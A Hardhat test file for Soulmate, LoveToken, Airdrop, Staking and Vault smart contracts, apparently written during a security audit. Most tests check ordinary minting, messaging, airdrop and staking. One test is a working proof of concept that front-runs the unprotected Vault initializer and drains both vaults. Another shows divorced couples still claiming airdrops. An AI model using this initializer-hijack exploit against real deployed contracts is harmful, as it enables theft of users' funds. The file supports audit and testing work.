const {time,loadFixture,} = require("@nomicfoundation/hardhat-toolbox/network-helpers");
const { anyValue } = require("@nomicfoundation/hardhat-chai-matchers/withArgs");
const { expect } = require("chai");
const { ethers } = require("hardhat");




describe("SoulMate Test", function(){

    const TOTAL_MINT_TOKENS = ethers.parseEther("500000000");
    const ONE_LOVETOKEN = ethers.parseEther("1");

async function start(){
    ///// SETUP CONTRACT 
    [deployer, soulmate1, soulmate2, soulmate3, soulmate4,  attacker] = await ethers.getSigners();
    const airDropVaultFactory = await ethers.getContractFactory("contracts/Vault.sol:Vault");
    const airDropVault = await airDropVaultFactory.deploy();
    const stakingVaultFactory = await ethers.getContractFactory("contracts/Vault.sol:Vault");
    const stakingVault = await stakingVaultFactory.deploy();
    const soulmateContractFactory = await ethers.getContractFactory("contracts/Soulmate.sol:Soulmate");
    const soulmateContract = await soulmateContractFactory.deploy();
    const loveTokenContractFactory = await ethers.getContractFactory("contracts/LoveToken.sol:LoveToken");
    const loveTokenContract = await loveTokenContractFactory.deploy(soulmateContract.target, airDropVault.target, stakingVault.target);
    const stakingContractFactory = await ethers.getContractFactory("contracts/Staking.sol:Staking");
    const stakingContract = await stakingContractFactory.deploy(loveTokenContract.target, soulmateContract.target, stakingVault.target);
    const airDropContractFactory = await ethers.getContractFactory("contracts/Airdrop.sol:Airdrop");
    const airDropContract = await airDropContractFactory.deploy(loveTokenContract.target, soulmateContract.target, airDropVault.target);
    await airDropVault.initVault(loveTokenContract.target, airDropContract.target);
    await stakingVault.initVault(loveTokenContract.target, stakingContract.target);

    return {deployer, soulmate1, soulmate2, soulmate3, soulmate4, attacker, airDropVault, stakingVault, loveTokenContract, stakingContract, airDropContract, soulmateContract};
}


describe("SoulMate, AirDrop, Staking, Vault, LoveToken Test", async function(){

it("airDropVault + stakingVault have 500_000_000", async function(){
    const {soulmate1, soulmate2, attacker, loveTokenContract, airDropVault, stakingVault} = await loadFixture(start);
    expect(await loveTokenContract.balanceOf(airDropVault.target)).to.eq(TOTAL_MINT_TOKENS);
    expect(await loveTokenContract.balanceOf(stakingVault.target)).to.eq(TOTAL_MINT_TOKENS);

});

it("Mint NFT 1 for Couple", async function(){
    const {soulmate1, soulmate2, soulmate3, soulmate4, soulmateContract, loveTokenContract, airDropVault, stakingVault} = await loadFixture(start);
    await soulmateContract.connect(soulmate1).mintSoulmateToken();
    await soulmateContract.connect(soulmate2).mintSoulmateToken();
    expect(await soulmateContract.balanceOf(soulmate2)).to.eq(1);

});

it("Test Messages", async function(){
    const {soulmate1, soulmate2, soulmate3, soulmate4, soulmateContract, loveTokenContract, airDropVault, stakingVault} = await loadFixture(start);
    await soulmateContract.connect(soulmate1).mintSoulmateToken();
    await soulmateContract.connect(soulmate2).mintSoulmateToken();
    console.log("====================================");
    console.log("DEFAULT MESSAGE: ", await soulmateContract.connect(soulmate1).readMessageInSharedSpace())
    await soulmateContract.connect(soulmate1).writeMessageInSharedSpace("Soulmate #1 sent - Message 1a");
    console.log("soulmate1 sets message");
    console.log("soulmate1 views MSG: ", await soulmateContract.connect(soulmate1).readMessageInSharedSpace());
    console.log("soulmate2 does not check message");
    console.log("soulmate2 sets a message without checking");
    await soulmateContract.connect(soulmate2).writeMessageInSharedSpace("Soulmate #2 sent- Message 1b");
    console.log("soulmate1 Checks MSG: ",await soulmateContract.connect(soulmate1).readMessageInSharedSpace());
    console.log("soulmate2 Checks MSG: ",await soulmateContract.connect(soulmate2).readMessageInSharedSpace());
    console.log("====================================");
    // console.log(await soulmateContract.connect(soulmate1).readMessageInSharedSpace());
   // await soulmateContract.connect(soulmate2).writeMessageInSharedSpace("Message 2");
});

it("getDivorce Test", async function(){
    const {soulmate1, soulmate2, soulmate3, soulmate4, soulmateContract, loveTokenContract, airDropVault, stakingVault} = await loadFixture(start);
    await soulmateContract.connect(soulmate1).mintSoulmateToken();
    await soulmateContract.connect(soulmate2).mintSoulmateToken();
    await soulmateContract.connect(soulmate2).getDivorced();
    expect(await soulmateContract.connect(soulmate2).isDivorced()).to.eq(true);
    expect(await soulmateContract.connect(soulmate1).isDivorced()).to.eq(true);
    await expect(soulmateContract.connect(soulmate1).mintSoulmateToken()).to.revertedWithCustomError(soulmateContract, "Soulmate__alreadyHaveASoulmate");

});

it("Couple Receive Love Airdrop Test", async function(){
    const {soulmate1, soulmate2, soulmate3, soulmate4, soulmateContract, loveTokenContract, airDropContract, airDropVault, stakingVault} = await loadFixture(start);
   await soulmateContract.connect(soulmate1).mintSoulmateToken();
   await soulmateContract.connect(soulmate2).mintSoulmateToken();

  
   await expect(airDropContract.connect(soulmate1).claim()).to.revertedWithCustomError(airDropContract, "Airdrop__PreviousTokenAlreadyClaimed");
   await expect(airDropContract.connect(soulmate2).claim()).to.revertedWithCustomError(airDropContract, "Airdrop__PreviousTokenAlreadyClaimed");
   
   expect(await loveTokenContract.balanceOf(soulmate1.address)).to.eq(0);
   //// Fast forward Time
   await network.provider.send("evm_increaseTime", [86400]);
   await network.provider.send("evm_mine");
   await airDropContract.connect(soulmate1).claim();

   expect(await loveTokenContract.balanceOf(soulmate1.address)).to.eq(ONE_LOVETOKEN);
   expect(await loveTokenContract.balanceOf(soulmate2.address)).to.eq(0);
   expect(await loveTokenContract.balanceOf(airDropVault.target)).to.eq(TOTAL_MINT_TOKENS - ONE_LOVETOKEN);
   
});

it("Divorced Couple STILL receives Love Airdrop Test", async function(){
   const {soulmate1, soulmate2, soulmate3, soulmate4, soulmateContract, loveTokenContract, airDropContract, airDropVault, stakingVault} = await loadFixture(start);
   await soulmateContract.connect(soulmate1).mintSoulmateToken();
   await soulmateContract.connect(soulmate2).mintSoulmateToken();
   await soulmateContract.connect(soulmate2).getDivorced();
 
   expect(await loveTokenContract.balanceOf(soulmate1.address)).to.eq(0);
   //// Fast forward Time
   await network.provider.send("evm_increaseTime", [86400]);
   await network.provider.send("evm_mine");
   ///await expect (airDropContract.connect(soulmate1).claim()).to.revertedWithCustomError(airDropContract,"Airdrop__CoupleIsDivorced");
   await airDropContract.connect(soulmate1).claim();
   expect(await loveTokenContract.balanceOf(soulmate1.address)).to.eq(ONE_LOVETOKEN);
});

it("Staking Test, Claim + Withdraw", async function(){
    const {soulmate1, soulmate2, soulmate3, soulmate4, soulmateContract, loveTokenContract, airDropContract, airDropVault, stakingContract, stakingVault} = await loadFixture(start);
    await soulmateContract.connect(soulmate1).mintSoulmateToken();
    await soulmateContract.connect(soulmate2).mintSoulmateToken();

    await network.provider.send("evm_increaseTime", [86400]);
    await network.provider.send("evm_mine");
    await airDropContract.connect(soulmate1).claim();
    await airDropContract.connect(soulmate2).claim();

    expect(await loveTokenContract.balanceOf(soulmate1)).to.eq(ONE_LOVETOKEN);
    expect(await loveTokenContract.balanceOf(soulmate2)).to.eq(ONE_LOVETOKEN);
 
    await loveTokenContract.connect(soulmate1).approve(stakingContract.target, ONE_LOVETOKEN);
    await stakingContract.connect(soulmate1).deposit(ONE_LOVETOKEN);
    expect(await loveTokenContract.balanceOf(stakingContract.target)).to.eq(ONE_LOVETOKEN);
    expect(await loveTokenContract.balanceOf(soulmate1.address)).to.eq(0);
    await expect(stakingContract.connect(soulmate1).claimRewards()).to.revertedWithCustomError(stakingContract, "Staking__StakingPeriodTooShort");
    //// Fast forward Time
    await network.provider.send("evm_increaseTime", [86400 *6]);
    await network.provider.send("evm_mine");
    await stakingContract.connect(soulmate1).claimRewards();
    
    expect(await loveTokenContract.balanceOf(soulmate1.address)).to.eq(ONE_LOVETOKEN);
    //// Fast forward Time
    await network.provider.send("evm_increaseTime", [86400 *7]);
    await network.provider.send("evm_mine");
    await stakingContract.connect(soulmate1).claimRewards();
   
    expect(await loveTokenContract.balanceOf(soulmate1.address)).to.eq(ONE_LOVETOKEN + ONE_LOVETOKEN);

    await stakingContract.connect(soulmate1).withdraw(ethers.parseEther("1"));
    expect(await loveTokenContract.balanceOf(soulmate1.address)).to.eq(ONE_LOVETOKEN + ONE_LOVETOKEN + ONE_LOVETOKEN);


});

it("Vault Attacker Exploit", async function(){
    [attacker] = await ethers.getSigners();

    /// SETUP
    const airDropVaultFactory = await ethers.getContractFactory("contracts/Vault.sol:Vault");
    const airDropVault = await airDropVaultFactory.deploy();
    const stakingVaultFactory = await ethers.getContractFactory("contracts/Vault.sol:Vault");
    const stakingVault = await stakingVaultFactory.deploy();
    const soulmateContractFactory = await ethers.getContractFactory("contracts/Soulmate.sol:Soulmate");
    const soulmateContract = await soulmateContractFactory.deploy();
    const loveTokenContractFactory = await ethers.getContractFactory("contracts/LoveToken.sol:LoveToken");
    const loveTokenContract = await loveTokenContractFactory.deploy(soulmateContract.target, airDropVault.target, stakingVault.target);
    const stakingContractFactory = await ethers.getContractFactory("contracts/Staking.sol:Staking");
    const stakingContract = await stakingContractFactory.deploy(loveTokenContract.target, soulmateContract.target, stakingVault.target);
    const airDropContractFactory = await ethers.getContractFactory("contracts/Airdrop.sol:Airdrop");
    const airDropContract = await airDropContractFactory.deploy(loveTokenContract.target, soulmateContract.target, airDropVault.target);
    
    ////  InitVault
    await airDropVault.connect(attacker).initVault(loveTokenContract.target, attacker.address);
    await stakingVault.connect(attacker).initVault(loveTokenContract.target, attacker.address);

    //// Conclusion
    console.log("==========  Before Init  ===============");
    console.log("Attacker Wallet Balance =>",await loveTokenContract.balanceOf(attacker.address));
    console.log("StakingVault Balance =>",await loveTokenContract.balanceOf(stakingVault.target));
    console.log("AirDropVault Balance =>",await loveTokenContract.balanceOf(airDropVault.target));
    console.log("");
    console.log("---Attacker Calls loveTokenContract TransferFrom [stakingVault, airdropVault] --");
    console.log("");

    await loveTokenContract.connect(attacker).transferFrom(stakingVault.target, attacker.address, ethers.parseEther("500000000"));
    await loveTokenContract.connect(attacker).transferFrom(airDropVault.target, attacker.address, ethers.parseEther("500000000"));

    console.log("==========  After Init  ===============");
    console.log("StakingVault Wallet Balance =>",await loveTokenContract.balanceOf(stakingVault.target));
    console.log("AirDropVault Wallet Balance =>",await loveTokenContract.balanceOf(airDropVault.target));
    console.log("Attackers Wallet Balance =>",await loveTokenContract.balanceOf(attacker.address));


});





});


})